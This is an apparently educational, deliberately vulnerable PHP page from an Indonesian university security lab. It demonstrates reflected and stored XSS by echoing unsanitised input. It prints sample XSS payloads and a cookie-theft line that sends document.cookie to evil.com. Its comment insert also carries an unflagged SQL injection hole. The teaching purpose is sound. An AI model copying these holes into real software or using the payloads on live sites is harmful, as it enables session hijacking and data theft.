<?php
/**
 * ============================================================================
 * ⚠️ KODE INI SENGAJA DIBUAT RENTAN — HANYA UNTUK EDUKASI!
 * ============================================================================
 * Kategori  : Bonus — Cross-Site Scripting (XSS)
 * Risiko    : HIGH
 * Deskripsi : Kode ini mendemonstrasikan Reflected XSS dan Stored XSS.
 * 
 * DISCLAIMER: Jangan gunakan teknik ini untuk menyerang sistem tanpa izin!
 *             Baca DISCLAIMER.md untuk informasi hukum lengkap.
 * 
 * CYBERSHIELD 2026 — HIMTIF Universitas Pamulang
 * ============================================================================
 */

$conn = new mysqli("127.0.0.1", "root", "", "cybershield_lab");

echo "<h1>🔴 RENTAN — Cross-Site Scripting (XSS)</h1>";
echo "<hr>";
echo "<p><strong>Skenario:</strong> Form komentar dan pencarian yang rentan terhadap XSS.</p>";
echo "<hr>";

// ========================================
// REFLECTED XSS
// ========================================
echo "<h2>1. Reflected XSS ⚠️</h2>";
echo "<p>Input langsung di-render ke halaman tanpa sanitasi.</p>";
echo "<p><strong>Coba:</strong> <code>&lt;script&gt;alert('XSS!')&lt;/script&gt;</code></p>";
echo "<p>Atau: <code>&lt;img src=x onerror=alert('XSS!')&gt;</code></p>";

echo "<form method='GET' style='margin:10px 0;'>";
echo "<input type='text' name='q' placeholder=\"Coba: <script>alert('XSS')</script>\" style='padding:10px;width:400px;border:2px solid #ff6b6b;border-radius:5px;' value='" . ($_GET['q'] ?? '') . "'>";
echo "&nbsp;<button type='submit' style='padding:10px 20px;background:#ff6b6b;color:white;border:none;border-radius:5px;cursor:pointer;'>Cari</button>";
echo "</form>";

if (isset($_GET['q'])) {
    $search = $_GET['q'];
    
    // ⚠️ RENTAN: Input user langsung di-echo tanpa sanitasi!
    echo "<div style='background:#1a1a2e;color:#eee;padding:15px;border-radius:8px;margin:10px 0;'>";
    echo "<p>Hasil pencarian untuk: <strong>{$search}</strong></p>";
    echo "<p>⚠️ Input di-render tanpa htmlspecialchars() — JavaScript akan dieksekusi!</p>";
    echo "</div>";
}

echo "<br>";

// ========================================
// STORED XSS
// ========================================
echo "<h2>2. Stored XSS ⚠️</h2>";
echo "<p>Komentar disimpan ke database dan ditampilkan tanpa sanitasi.</p>";

// Simpan komentar (simulasi)
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['comment'])) {
    $username = $_POST['username'] ?? 'Anonymous';
    $comment = $_POST['comment'];
    
    // ⚠️ RENTAN: Komentar disimpan tanpa sanitasi
    if ($conn->ping()) {
        $conn->query("INSERT INTO comments (username, comment) VALUES ('{$username}', '{$comment}')");
    }
}

echo "<form method='POST' style='margin:10px 0;background:#1a1a2e;padding:20px;border-radius:8px;color:white;'>";
echo "<h3>💬 Tulis Komentar</h3>";
echo "<p><input type='text' name='username' placeholder='Nama' style='padding:8px;width:200px;border-radius:5px;border:1px solid #555;'></p>";
echo "<p><textarea name='comment' placeholder=\"Coba: <script>alert('Stored XSS!')</script>\" style='padding:8px;width:400px;height:80px;border-radius:5px;border:1px solid #555;'></textarea></p>";
echo "<button type='submit' style='padding:10px 20px;background:#ff6b6b;color:white;border:none;border-radius:5px;cursor:pointer;'>Kirim</button>";
echo "</form>";

// Tampilkan komentar
echo "<h3>📝 Komentar Tersimpan:</h3>";
if ($conn->ping()) {
    $result = $conn->query("SELECT * FROM comments ORDER BY created_at DESC LIMIT 10");
    if ($result && $result->num_rows > 0) {
        while ($row = $result->fetch_assoc()) {
            // ⚠️ RENTAN: Output langsung tanpa encoding!
            echo "<div style='background:#2a2a3e;color:#eee;padding:10px;border-radius:5px;margin:5px 0;'>";
            echo "<strong>{$row['username']}</strong> <small style='color:#aaa;'>{$row['created_at']}</small><br>";
            echo "{$row['comment']}"; // ⚠️ XSS! Script dalam komentar akan dieksekusi
            echo "</div>";
        }
    }
} else {
    echo "<p style='color:orange;'>Database tidak tersedia. Contoh output:</p>";
    echo "<div style='background:#2a2a3e;color:#eee;padding:10px;border-radius:5px;margin:5px 0;'>";
    echo "<strong>Hacker</strong> <small style='color:#aaa;'>2024-03-15</small><br>";
    echo "Komentar normal... tapi jika ada script: ⚠️ akan dieksekusi oleh browser!";
    echo "</div>";
}

echo "<br>";
echo "<div style='background:#ff6b6b;color:#fff;padding:15px;border-radius:8px;'>";
echo "<h3>⚠️ Kerentanan XSS:</h3>";
echo "<ol>";
echo "<li><strong>Reflected XSS:</strong> Input di URL langsung di-render ke halaman.</li>";
echo "<li><strong>Stored XSS:</strong> Script berbahaya tersimpan di database dan dieksekusi setiap kali halaman dibuka.</li>";
echo "<li><strong>Cookie Theft:</strong> <code>&lt;script&gt;fetch('http://evil.com?c='+document.cookie)&lt;/script&gt;</code></li>";
echo "<li><strong>Session Hijacking:</strong> Penyerang bisa mengambil alih sesi user lain.</li>";
echo "<li><strong>Keylogging:</strong> Penyerang bisa memasang keylogger JavaScript.</li>";
echo "</ol>";
echo "</div>";

echo "<br><a href='secure.php'>➡️ Lihat versi AMAN</a>";
?>
